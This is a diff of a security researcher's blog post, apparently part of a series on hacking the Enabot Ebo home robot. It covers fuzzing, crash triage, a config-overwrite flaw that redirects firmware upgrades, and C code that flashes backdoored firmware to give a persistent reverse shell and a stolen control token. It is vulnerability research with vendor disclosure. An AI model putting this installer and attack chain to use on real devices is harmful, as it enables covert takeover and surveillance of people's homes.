@@ -31,7 +31,7 @@ In the previous post we went over reversing the Ebo's protocol and creating our 
 
 # Our Initial Plan
 
-Right off the bat we were interested in using fuzzing as a means of finding vulnerabilities. We figured if we could just throw thousands of packets at it, it would eventually break and we'd have a way in. Qiling is an open emulator that supports arm and can emulated linux syscalls. It was perfect for the target we were looking at. We also figured we could fuzz on the actual device at the same time using Radamsa. Radamsa is also an open source fuzzer, but it's really dumb. Even though it randomly changes input, we knew we would have to give it some guidance on the branches it should take. Both of these methods will be explained in depth.
+Right off the bat we were interested in using fuzzing as a means of finding vulnerabilities. We figured if we could just throw thousands of packets at it, it would eventually break and we'd have a way in. Qiling is an open source emulator that supports arm and can emulate linux syscalls. It was perfect for the target we were looking at. We also figured we could fuzz on the actual device at the same time using Radamsa. Radamsa is also an open source fuzzer, but it's really dumb. Even though it randomly changes input, we knew we would have to give it some guidance on the branches it should take. Both of these methods will be explained in depth.
 
 # Mavlink packets
 
@@ -281,9 +281,9 @@ while True:
 ```
 The fuzzable variable was a sample packet that we grabbed and included the TUTK ID. We only fuzz after the token which is why it's indexed with "16::". We generate the header with some random values in it where the only requirement for the header is the 0x0402 and the 0x21 in it. Then we scramble the packet and send it on its way. We ping the device afterwards to verify it didn't crash. If a ping doesn't respond it's because the device crashed, and we save the last 50 packets we sent to a folder. That way we have a buffer in case there was a delay before the device crashed after receiving the crash packet.
 
-The biggest benefit of this fuzzer is that it was insanely simple and quick to write. The downfall is Aside from the branch values, it's up to chance to hit all the different code blocks aside from that.
+The biggest benefit of this fuzzer is that it was insanely simple and quick to write. The downfall is that aside from the branch values, it's up to chance to hit all the different code blocks within those branches.
 
-Using this method we did find a few vulnerabilities, but they were not exploitable. We quickly figured out why our snapshot fuzzer wasn't getting the same crashes, and then fixed it so it's coverage was better. After that we were seeing the same crashes as the radamsa fuzzer. In the next section we'll go through how we traiged one of the crashes and deemed how it wasn't exploitable.
+Using this method we did find a few crashes, but they were not exploitable. We quickly figured out why our snapshot fuzzer wasn't getting the same crashes, and then fixed it so it's coverage was better. After that we were seeing the same crashes as the radamsa fuzzer. In the next section we'll go through how we traiged one of the crashes and deemed how it wasn't exploitable.
 
 # Static Analysis on the crash
 
@@ -335,9 +335,9 @@ After looking at a packet that crashed it we saw how it lined up. It turns out t
 
 <p style="text-align:center;"><img src="/assets/enabot_part3/segfault_packet.png" alt="ebocontrol" style="height: 80%; width:80%;"/></p>
 
-The packet above causes a segfault. We see the branch value at offset 0x08 and 0x09 which is 0x510 but, but is really 0x1005 because of endianess. Then we see the value that will determine the number of times to loop at offset 0x2D and 0x2D which will turn out to be 0x8180 again due to endianess. Each one of those loops will increment the heap address by 0x10. In total it would increment try 0x80180 which is larger than the mapped space for it, so eventually it would increment out of its mapping and attempt to read unmapped memory which results in a segfault.
+The packet above causes a segfault. We see the branch value at offset 0x08 and 0x09 which is 0x510 but, but is really 0x1005 because of endianess. Then we see the value that will determine the number of times to loop at offset 0x2C and 0x2D which will turn out to be 0x8180 again due to endianess. Each one of those loops will increment the heap address by 0x10. In total it would increment try 0x80180 which is larger than the mapped space for it, so eventually it would increment out of its mapping and attempt to read unmapped memory which results in a segfault.
 
-This isn't exploitable because we can't control anything written to the heap. It just keeps indexing the heap address and that's it.
+This isn't exploitable because we can't control anything written to the heap. It just keeps indexing the heap address, reads from it, and that's it.
 
 
 # The Vulnerability
@@ -356,7 +356,7 @@ Somehow we were completely overwriting and creating our own values in the ebo.cf
 <p style="text-align:center;"><img src="/assets/enabot_part3/upgrade_from_config.png" alt="ebocontrol" style="height: 70%; width:70%;"/></p>
 
 
-We can see that it's grabbing the ```server-domain``` parameter from the config as part of the handleUpgradeRequest function. This was perfect because if we could overwrite the config to point to own own server, we could also trigger an upgrade from one of the mavlink commands that we mentioned earlier in the fuzzing sections. This would allow us to send alot more input that it doesn't expect, and install a rootkit onto the device if we could send it a fake download file.
+We can see that it's grabbing the ```server-domain``` parameter from the config as part of the handleUpgradeRequest function. This was perfect because if we could overwrite the config to point to own own server, we could also trigger an upgrade from one of the mavlink commands that we mentioned earlier in the fuzzing sections. This would allow us to send alot more input that it doesn't expect, and install a persistent reverse shell onto the device if we could send it a fake download file.
 
 First, we had to figure out how to successfully overwrite the config. After some testing from our ebo server, we figured out that the mavlink branch that was overwriting config values is 0xe5. At a certain offset after the start of the mavlink branch, it would look for a string that it would use to add to the config. The format was supposed to be `config_header - header_parameter`. So say you wanted to add a time parameter to the video header, you would send `video - time`. Then it would grab a value from later down in the packet to put at the value for the paramter. Here is an example of them setting the timezone config. 
 
@@ -388,16 +388,16 @@ Now for some reason even after sending an update it still uses the original conf
 
 Conviently one of the mavlink commands also can trigger a soft reboot where the device reboots silently. So we can modify the config, reboot the device, and when we trigger and update, it'll reach back to our server. 
 
-> At the time of writing this, we just realized they misspelled "protocol" in the config. It must default to use the port when they normally update. We could still overwrite it, but it isn't necessary as we still are getting http requests. 
+> At the time of writing this, we just realized they misspelled "protocol" in the config. It must default to use the port when they normally update. We could still overwrite it, but it isn't necessary as we still were getting http requests. 
 
-In the next section we'll go over how we were able to exploit the device once it reached back to our server once we had changed the config.
+In the next section we'll go over how we were able to exploit the device with it's modified config
 
 
 
 
 # Exploitation
 
-Ultimately we wanted a shell on the device. This way we could get a shell, steal the saved server token, install something malicious in the firmware, and then place the token back on the device without there being a trace of what happened. This way we could access the device at any time with a reverse shell and be able to use the ebo server, etc. and the owner would have no clue.
+Ultimately we wanted a shell on the device. This way we could get a shell, steal the saved server token, install something malicious in the firmware, and then place the token back on the device without there being a trace of what happened. This way we could access the device at any time with a reverse shell and be able to use the ebo server, etc. remotely. 
 
 We'll go over the path of an upgrade to help better understand how we were able to exploit this vulnerability. First, when we triggered an upgrade using the mavlink branch value ```0xcd```, we hit this section of the code where it enters `handleUartUpgradeRequest`.
 
@@ -521,7 +521,7 @@ DECIMAL       HEXADECIMAL     DESCRIPTION
 
 We can see that 1 inode was added since we added a file, and the size grew by 26 bytes. If we did the math, it would probably line up to be the same amount of bytes we wrote in the rcS and the hello file post compression.
 
-Now we can write some C code to reprogram the mtd block and install our rootkit. Shoutouts to stackoverflow for most of the code.
+Now we can write some C code to reprogram the mtd block and install our malicious firmware. Shoutouts to stackoverflow for most of the code.
 
 ```c
 #include <stdio.h>
@@ -537,37 +537,37 @@ int main()
     erase_info_t ei;               // the erase block structure
     int i;
     unsigned char sanity_read_buf[20] = {0x00};                // empty array for reading
-    FILE    *rootkit_file;
-    char    *rootkit_buffer;
+    FILE    *backdoor_file;
+    char    *backdoor_buffer;
     long    numbytes;
     /* open an existing file for reading */
-    rootkit_file = fopen("/var/avi/mmc0/rootkit_rootfs.sqashfs", "rb");
+    backdoor_file = fopen("/var/avi/mmc0/backdoor_rootfs.sqashfs", "rb");
     
     /* quit if the file does not exist */
-    if((void *)rootkit_file == NULL){
-        // printf("Failed to FIND /var/avi/mmc0/rootkit_rootfs.sqashfs\n");
+    if((void *)backdoor_file == NULL){
+        // printf("Failed to FIND /var/avi/mmc0/backdoor_rootfs.sqashfs\n");
         return 1;
     }
     /* Get the number of bytes */
-    fseek(rootkit_file, 0L, SEEK_END);
-    numbytes = ftell(rootkit_file);
-    printf("Rootkit file size: %x\n", numbytes); 
-    close(rootkit_file);
+    fseek(backdoor_file, 0L, SEEK_END);
+    numbytes = ftell(backdoor_file);
+    printf("backdoor file size: %x\n", numbytes); 
+    close(backdoor_file);
     // Reopen since seeking was being dumb
-    rootkit_file = fopen("/var/avi/mmc0/rootkit_rootfs.sqashfs", "rb");
+    backdoor_file = fopen("/var/avi/mmc0/backdoor_rootfs.sqashfs", "rb");
     /* grab sufficient memory for the 
-    rootkit_buffer to hold the text */
-    rootkit_buffer = (char*)malloc(numbytes);	
+    backdoor_buffer to hold the text */
+    backdoor_buffer = (char*)malloc(numbytes);	
     
 
-    /* copy all the text into the rootkit_buffer */
-    int bytes_read = fread(rootkit_buffer, sizeof(char), numbytes, rootkit_file);
+    /* copy all the text into the backdoor_buffer */
+    int bytes_read = fread(backdoor_buffer, sizeof(char), numbytes, backdoor_file);
     /* memory error */
-    if(rootkit_buffer == NULL){
-        printf("Failed to READ /var/avi/mmc0/rootkit_rootfs.sqashfs\n");
+    if(backdoor_buffer == NULL){
+        printf("Failed to READ /var/avi/mmc0/backdoor_rootfs.sqashfs\n");
         return 1;
     }
-    printf("Bytes read: %x, File bytes: %x\n", bytes_read, (unsigned int )*rootkit_buffer);
+    printf("Bytes read: %x, File bytes: %x\n", bytes_read, (unsigned int )*backdoor_buffer);
     int mtd2_fd = open("/dev/mtd2", O_RDWR); // open the mtd2 device for reading and 
                                         // writing. Note you want mtd2 not mtdblock2
                                         //! also you probably need to open permissions
@@ -598,8 +598,8 @@ int main()
     close(mtd2_fd);
     // reopen since seeking was being dumb
     mtd2_fd = open("/dev/mtd2", O_RDWR); // open the mtd2 device for reading and 
-    printf("Writing rootkit to rootfs(mtd2)\n");
-    write(mtd2_fd, rootkit_buffer, numbytes); // write our message
+    printf("Writing backdoor to rootfs(mtd2)\n");
+    write(mtd2_fd, backdoor_buffer, numbytes); // write our message
 
     lseek(mtd2_fd, 0, SEEK_SET);              // go back to first block's start
     read(mtd2_fd, sanity_read_buf, sizeof(sanity_read_buf));// read the data
@@ -607,18 +607,18 @@ int main()
     // sanity check, now you see the message we wrote!    
     printf("Check wrote buf[%d] = 0x%02x\n", i, (unsigned int)sanity_read_buf[0]);
 
-    free(rootkit_buffer);
+    free(backdoor_buffer);
     close(mtd2_fd);
     return 0;
 }
 
 ```
 
-We compile it with gcc and specify the architecture
+We compile it with arm's gcc and specify the architecture
 
-```arm-linux-gnueabi-gcc -march=armv5t --static install_rootkit.c -o install_rootkit```
+```arm-linux-gnueabi-gcc -march=armv5t --static install_backdoor.c -o install_backdoor```
 
-Then we'll transfer the rootkit and the compiled binary to install it to ```/var/avi/mmc0/``` on the device.
+Then we'll transfer the backdoor and the compiled binary to install it to ```/var/avi/mmc0/``` on the device.
 
 When we run it, we can see it prints everything and installs the rookit.
 
@@ -631,7 +631,7 @@ Now we can reboot the device and hope it works! We wait until its fully booted a
 
 And it worked! We connected and ran ```ps -A | grep hello``` to show that the hello script is running in the background. We were happy it worked too because if it didn't it may have been bricked till we took the chip off and reprogrammed it manually with the original firmware.
 
-From here on out, as long as the ebo is on, it will be attempting to connect to our host computer where we can then have complete access to it.
+From here on out, as long as the ebo is on, it will be attempting to connect to our host computer where we can then have complete access to it. And since this a reverse shell, we could set it to connect to anything. Since it's initiating the connection, we could connect it from anywhere as long as it's connected to the internet. This could easily be used to fully control and record/listen through the device over WAN with a little more reversing and some changes to the ebo server. Just to reiterate though, this can only be done AFTER the backdoor firmware is installed over the LAN exploit.
 
 Now we can add this to the rest of the exploit after we get our shell, and it will be fully automated from beginning to end.
 
@@ -655,19 +655,14 @@ Using the stolen token to fully control/listen/talk/record on the Ebo. Video fro
 
 We contacted the vendor and disclosed the vulnerability with them in an email. Multiple emails actually. And we never got a response. This vulnerability isn't severe enough for us not to disclose it to the public, it's only over LAN after all and an arp spoof is also required to get the tutk id on top of that.
 
-We will be submitting a CVE for the vulnerability, and hopefully a fix can be implemented if more attention is drawn to it.
+We will be submitting a CVE for the vulnerability, and hopefully a fix can be implemented.
 
 
 # Final Thoughts
 
-We aren't too excited about this vulnerability and exploit. Sure it gets the job done, but it's pretty lame all things considered. We would've enjoyed something more like a leak into a ropchain or a heap exploit, but this was simple and got the job done. Not to mention, this is only the first CVE, we're sure there will be plenty more. 
+We aren't too excited about this vulnerability and exploit. Sure it gets the job done, but it's just a LAN exploit using a comand injection. We would've enjoyed something more like a leak into a ropchain or a heap exploit, but this was simple and got the job done. Not to mention, this is only the first CVE, we're sure there will be plenty more. 
 
 The next vulnerability we find we would like it to not require the TUTK ID, or if it does require some kind of ID, it would be some authenticaion vulnerability that we could do over WAN.
-
-
-Show paths of it looking for strings
-Show the command injection path
-
 
 # Tools
 
